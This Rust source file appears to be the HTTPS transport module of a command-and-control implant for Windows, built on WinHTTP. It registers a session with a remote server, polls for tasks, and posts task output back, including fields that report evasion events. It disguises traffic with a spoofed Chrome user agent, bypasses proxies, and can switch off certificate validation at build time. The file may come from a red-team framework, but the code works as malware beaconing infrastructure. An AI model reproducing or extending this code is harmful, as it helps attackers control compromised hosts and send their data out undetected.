use core::ffi::c_void;
use windows_sys::Win32::Networking::WinHttp::*;

use super::{Channel, ChannelError};
use crate::task::{PollResponse, RegisterRequest, RegisterResponse, TaskOutputRequest};

const DEFAULT_UA: &str =
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
     (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36";

fn user_agent() -> &'static str {
    match option_env!("DM_UA") {
        Some(ua) if !ua.is_empty() => ua,
        _ => DEFAULT_UA,
    }
}

const fn str_eq(a: &str, b: &str) -> bool {
    let (a, b) = (a.as_bytes(), b.as_bytes());
    if a.len() != b.len() { return false; }
    let mut i = 0;
    while i < a.len() {
        if a[i] != b[i] { return false; }
        i += 1;
    }
    true
}

pub const TLS_SKIP_VERIFY: bool = str_eq(env!("DM_TLS_SKIP_VERIFY"), "true");

fn to_wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(core::iter::once(0)).collect()
}

pub struct WinHttpChannel {
    h_session: *mut c_void,
    h_connect: *mut c_void,
    host:      String,
}

unsafe impl Send for WinHttpChannel {}

impl WinHttpChannel {
    pub fn new(host: &str, port: &str) -> Self {
        let ua       = to_wide(user_agent());
        let port_num: u16 = port.parse().unwrap_or(4443);

        let h_session = unsafe {
            WinHttpOpen(
                ua.as_ptr(),
                WINHTTP_ACCESS_TYPE_NO_PROXY,
                core::ptr::null(),
                core::ptr::null(),
                0,
            )
        };

        if !h_session.is_null() {
            // Allow TLS 1.0–1.3; Win10 defaults can be restrictive
            let protocols: u32 = 0x0080 | 0x0200 | 0x0800 | 0x2000;
            unsafe {
                WinHttpSetOption(
                    h_session,
                    WINHTTP_OPTION_SECURE_PROTOCOLS,
                    &protocols as *const u32 as *const _,
                    core::mem::size_of::<u32>() as u32,
                );
            }
        }

        let host_wide = to_wide(host);
        let h_connect = if !h_session.is_null() {
            unsafe { WinHttpConnect(h_session, host_wide.as_ptr(), port_num, 0) }
        } else {
            core::ptr::null_mut()
        };

        Self { h_session, h_connect, host: host.to_string() }
    }

    pub(crate) fn request(
        &self,
        method: &str,
        path:   &str,
        extra_headers: Option<&str>,
        body:   Option<&[u8]>,
    ) -> Result<Vec<u8>, ChannelError> {
        if self.h_connect.is_null() {
            return Err(ChannelError::Network("no connection handle".into()));
        }

        let method_w = to_wide(method);
        let path_w   = to_wide(path);

        let h_req = unsafe {
            WinHttpOpenRequest(
                self.h_connect,
                method_w.as_ptr(),
                path_w.as_ptr(),
                core::ptr::null(),
                core::ptr::null(),
                core::ptr::null(),
                WINHTTP_FLAG_SECURE,
            )
        };
        if h_req.is_null() {
            return Err(ChannelError::Network("WinHttpOpenRequest failed".into()));
        }

        if TLS_SKIP_VERIFY {
            // 0x0100 = IGNORE_UNKNOWN_CA, 0x0200 = IGNORE_WRONG_USAGE,
            // 0x1000 = IGNORE_CN_INVALID, 0x2000 = IGNORE_DATE_INVALID
            let flags: u32 = 0x0100 | 0x0200 | 0x1000 | 0x2000;
            unsafe {
                WinHttpSetOption(
                    h_req,
                    WINHTTP_OPTION_SECURITY_FLAGS,
                    &flags as *const u32 as *const _,
                    core::mem::size_of::<u32>() as u32,
                );
            }
        }

        if let Some(hdrs) = extra_headers {
            let hdrs_w = to_wide(hdrs);
            unsafe {
                WinHttpAddRequestHeaders(
                    h_req,
                    hdrs_w.as_ptr(),
                    hdrs_w.len() as u32 - 1,
                    WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE,
                );
            }
        }

        let (body_ptr, body_len) = match body {
            Some(b) => (b.as_ptr(), b.len() as u32),
            None    => (core::ptr::null(), 0u32),
        };

        let ok = unsafe {
            WinHttpSendRequest(
                h_req,
                core::ptr::null(),
                0,
                body_ptr as *const _,
                body_len,
                body_len,
                0,
            )
        };
        if ok == 0 {
            unsafe { WinHttpCloseHandle(h_req) };
            return Err(ChannelError::Network("WinHttpSendRequest failed".into()));
        }

        let ok = unsafe { WinHttpReceiveResponse(h_req, core::ptr::null_mut()) };
        if ok == 0 {
            unsafe { WinHttpCloseHandle(h_req) };
            return Err(ChannelError::Network("WinHttpReceiveResponse failed".into()));
        }

        let mut buf = Vec::new();
        loop {
            let mut avail: u32 = 0;
            let ok = unsafe { WinHttpQueryDataAvailable(h_req, &mut avail) };
            if ok == 0 || avail == 0 { break; }

            let start = buf.len();
            buf.resize(start + avail as usize, 0u8);
            let mut read: u32 = 0;
            let ok = unsafe {
                WinHttpReadData(h_req, buf[start..].as_mut_ptr() as *mut _, avail, &mut read)
            };
            if ok == 0 || read == 0 {
                buf.truncate(start);
                break;
            }
            buf.truncate(start + read as usize);
        }

        unsafe { WinHttpCloseHandle(h_req) };
        Ok(buf)
    }
}

impl Drop for WinHttpChannel {
    fn drop(&mut self) {
        unsafe {
            if !self.h_connect.is_null() { WinHttpCloseHandle(self.h_connect); }
            if !self.h_session.is_null() { WinHttpCloseHandle(self.h_session); }
        }
    }
}

impl Channel for WinHttpChannel {
    fn register(
        &mut self,
        req:  &RegisterRequest,
        path: &str,
    ) -> Result<RegisterResponse, ChannelError> {
        let body = serde_json::to_vec(req)
            .map_err(|e| ChannelError::Parse(e.to_string()))?;

        let hdrs = format!(
            "Content-Type: application/octet-stream\r\nX-Request-ID: {}\r\n",
            req.build_id
        );

        let bytes = self.request("POST", path, Some(&hdrs), Some(&body))?;

        serde_json::from_slice(&bytes)
            .map_err(|e| ChannelError::Parse(e.to_string()))
    }

    fn poll(
        &mut self,
        session: &crate::Session,
        path:    &str,
    ) -> Result<PollResponse, ChannelError> {
        let hdrs = format!("X-Request-ID: {}\r\n", session.id);
        let bytes = self.request("GET", path, Some(&hdrs), None)?;

        serde_json::from_slice(&bytes)
            .map_err(|e| ChannelError::Parse(e.to_string()))
    }

    fn submit_output(
        &mut self,
        session:             &crate::Session,
        path:                &str,
        task_id:             &str,
        output:              Vec<u8>,
        success:             bool,
        evasion_event:       bool,
        evasion_description: String,
    ) -> Result<(), ChannelError> {
        let req = TaskOutputRequest {
            session_id:          session.id.clone(),
            task_id:             task_id.to_string(),
            output,
            success,
            evasion_event,
            evasion_description,
        };

        let body = serde_json::to_vec(&req)
            .map_err(|e| ChannelError::Parse(e.to_string()))?;

        let hdrs = format!(
            "Content-Type: application/octet-stream\r\nX-Request-ID: {}\r\n",
            session.id
        );

        self.request("POST", path, Some(&hdrs), Some(&body))?;
        Ok(())
    }
}
